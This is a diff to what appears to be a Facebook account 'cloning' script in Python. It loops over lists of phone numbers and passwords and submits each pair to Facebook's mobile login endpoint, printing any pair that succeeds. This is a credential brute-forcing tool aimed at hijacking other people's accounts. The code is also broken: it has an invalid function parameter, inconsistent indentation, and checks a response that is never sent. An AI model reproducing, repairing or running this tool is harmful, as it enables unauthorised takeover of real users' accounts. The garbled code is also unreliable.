@@ -62,11 +62,17 @@ def main():
 def start_cloning(free.facebook.com):
     print("\nStarting Cloning...\n")
 
-    for phone in phone_numbers:
-        for password in passwords:
-            url = ('https://mbasic.facebook.com/login/device-based/login/async/'
-            ,data =log_data,headers=header_freefb).text 
-            response = requests.post(url, data=data)
+   for phone in phone_numbers:
+    for password in passwords:
+        url = "https://mbasic.facebook.com/login/device-based/login/async/"
+        
+        log_data = {
+            "email": phone,
+            "pass": password,
+            "login": "Log In"
+        }
+
+        print(f"Trying {phone} | {password}")
 
             if "success" in response.text:
                 print(f"\033[1;92m[✔] : {phone} | {password}\033[0m")
